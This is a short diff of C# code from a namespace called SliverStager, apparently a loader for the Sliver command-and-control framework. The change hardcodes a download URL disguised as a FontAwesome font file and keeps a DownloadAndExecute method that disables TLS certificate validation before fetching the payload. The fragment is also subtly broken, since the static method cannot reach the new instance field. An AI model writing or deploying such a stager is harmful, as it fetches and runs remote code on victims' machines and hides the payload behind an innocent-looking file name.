@@ -77,7 +77,9 @@ namespace SliverStager
 {
     public class Stager
     {
-        public static void DownloadAndExecute(string url)
+        private string url = "http://a.bc/fonts/FontAwesome.woff";
+
+        public static void DownloadAndExecute()
         {
             ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
             System.Net.WebClient client = new System.Net.WebClient();
